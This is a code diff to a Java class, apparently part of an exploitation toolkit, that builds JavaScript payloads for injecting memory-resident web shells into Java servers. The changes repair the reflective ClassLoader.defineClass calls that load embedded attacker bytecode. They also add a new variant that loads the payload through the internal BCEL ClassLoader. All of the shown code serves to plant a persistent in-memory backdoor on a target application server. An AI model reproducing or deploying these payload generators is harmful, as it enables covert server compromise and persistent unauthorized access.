@@ -33,11 +33,11 @@ public class MemShellJSUtils {
                                     "        }" +
                                     "    }" +
                                     "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
-                                    "    var clsByteArray = 'a'.getBytes().getClass();" +
+                                    "    var clsByteArray = (new java.lang.String('a').getBytes().getClass());" +
                                     "    var clsInt = java.lang.Integer.TYPE;" +
-                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', clsByteArray, clsInt, clsInt);" +
+                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
                                     "    defineClass.setAccessible(true);" +
-                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);" +
+                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
                                     "    clazz.newInstance();" +
                                     "}");
                 case MemShellClassFactory.BIGINTEGER:
@@ -51,13 +51,17 @@ public class MemShellJSUtils {
                                     "    var bytecodeRaw = '" + classFactory2.getPayload() + "';" +
                                     "    var bytecode = new java.math.BigInteger(bytecodeRaw,36).toByteArray();" +
                                     "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
-                                    "    var clsByteArray = 'a'.getBytes().getClass();" +
+                                    "    var clsByteArray = (new java.lang.String('a').getBytes().getClass());" +
                                     "    var clsInt = java.lang.Integer.TYPE;" +
-                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', clsByteArray, clsInt, clsInt);" +
+                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
                                     "    defineClass.setAccessible(true);" +
-                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);" +
+                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
                                     "    clazz.newInstance();" +
                                     "}");
+                case MemShellClassFactory.BCEL:
+                    MemShellClassFactory classFactory3 = new MemShellClassFactory(memShell, MemShellClassFactory.BCEL);
+                    return removeDuelSpace(
+                            "try {load('nashorn:mozilla_compat.js');}catch (e) {}importPackage(Packages.sun.misc); new com.sun.org.apache.bcel.internal.util.ClassLoader(new java.net.URLClassLoader(URLClassPath.pathToURLs(''),java.lang.Thread.currentThread().getContextClassLoader())).loadClass('" + classFactory3.getPayload() + "').newInstance();");
             }
         } catch (Exception ex) {
             return "生成发生错误:" + ex.getMessage();
